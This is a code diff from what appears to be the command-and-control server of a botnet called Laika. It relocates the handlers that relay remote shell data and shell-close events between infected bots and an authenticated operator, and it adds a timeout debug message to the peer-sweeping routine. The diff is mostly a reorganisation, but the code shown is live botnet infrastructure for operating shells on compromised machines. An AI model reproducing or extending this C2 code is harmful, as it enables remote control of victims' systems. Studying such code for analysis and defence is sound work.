@@ -57,38 +57,6 @@ uint64_t cnc_PeerElemHash(const void *item, uint64_t seed0, uint64_t seed1) {
 
 /* ============================================[[ Packet Handlers ]]============================================= */
 
-void laikaC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
-    struct sLaika_botInfo *bInfo = (struct sLaika_botInfo*)uData;
-    struct sLaika_cnc *cnc = bInfo->info.cnc;
-    uint8_t _res = laikaS_readByte(&peer->sock);
-
-    if (bInfo->shellAuth == NULL)
-        LAIKA_ERROR("LAIKAPKT_SHELL_CLOSE malformed packet!");
-
-    /* forward to SHELL_CLOSE to auth */
-    laikaS_emptyOutPacket(bInfo->shellAuth, LAIKAPKT_SHELL_CLOSE);
-
-    /* close shell */
-    ((struct sLaika_authInfo*)(bInfo->shellAuth->uData))->shellBot = NULL;
-    bInfo->shellAuth = NULL;
-}
-
-void laikaC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
-    char buf[LAIKA_SHELL_DATA_MAX_LENGTH];
-    struct sLaika_botInfo *bInfo = (struct sLaika_botInfo*)uData;
-    uint8_t id;
-
-    if (bInfo->shellAuth == NULL || sz < 1 || sz > LAIKA_SHELL_DATA_MAX_LENGTH)
-        LAIKA_ERROR("LAIKAPKT_SHELL_DATA malformed packet!");
-
-    laikaS_read(&peer->sock, (void*)buf, sz);
-
-    /* forward SHELL_DATA packet to auth */
-    laikaS_startVarPacket(bInfo->shellAuth, LAIKAPKT_SHELL_DATA);
-    laikaS_write(&bInfo->shellAuth->sock, buf, sz);
-    laikaS_endVarPacket(bInfo->shellAuth);
-}
-
 void laikaC_handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
     char magicBuf[LAIKA_MAGICLEN];
     struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)uData;
@@ -141,6 +109,38 @@ void laikaC_handlePing(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) 
 
     pInfo->lastPing = laikaT_getTime();
     laikaS_emptyOutPacket(peer, LAIKAPKT_PINGPONG); /* gg 2 ez */
+}
+
+void laikaC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
+    struct sLaika_botInfo *bInfo = (struct sLaika_botInfo*)uData;
+    struct sLaika_cnc *cnc = bInfo->info.cnc;
+    uint8_t _res = laikaS_readByte(&peer->sock);
+
+    if (bInfo->shellAuth == NULL)
+        LAIKA_ERROR("LAIKAPKT_SHELL_CLOSE malformed packet!");
+
+    /* forward to SHELL_CLOSE to auth */
+    laikaS_emptyOutPacket(bInfo->shellAuth, LAIKAPKT_SHELL_CLOSE);
+
+    /* close shell */
+    ((struct sLaika_authInfo*)(bInfo->shellAuth->uData))->shellBot = NULL;
+    bInfo->shellAuth = NULL;
+}
+
+void laikaC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
+    char buf[LAIKA_SHELL_DATA_MAX_LENGTH];
+    struct sLaika_botInfo *bInfo = (struct sLaika_botInfo*)uData;
+    uint8_t id;
+
+    if (bInfo->shellAuth == NULL || sz < 1 || sz > LAIKA_SHELL_DATA_MAX_LENGTH)
+        LAIKA_ERROR("LAIKAPKT_SHELL_DATA malformed packet!");
+
+    laikaS_read(&peer->sock, (void*)buf, sz);
+
+    /* forward SHELL_DATA packet to auth */
+    laikaS_startVarPacket(bInfo->shellAuth, LAIKAPKT_SHELL_DATA);
+    laikaS_write(&bInfo->shellAuth->sock, buf, sz);
+    laikaS_endVarPacket(bInfo->shellAuth);
 }
 
 /* =============================================[[ Packet Tables ]]============================================== */
@@ -440,8 +440,10 @@ bool sweepPeers(struct sLaika_peer *peer, void *uData) {
     long currTime = laikaT_getTime();
 
     /* peer has been silent for a while, kill 'em */
-    if (currTime - pInfo->lastPing > LAIKA_PEER_TIMEOUT)
+    if (currTime - pInfo->lastPing > LAIKA_PEER_TIMEOUT) {
+        LAIKA_DEBUG("timeout reached for %p! [%d]\n", peer, currTime - pInfo->lastPing);
         laikaC_killPeer(cnc, peer);
+    }
 }
 
 void laikaC_sweepPeersTask(struct sLaika_taskService *service, struct sLaika_task *task, clock_t currTick, void *uData) {
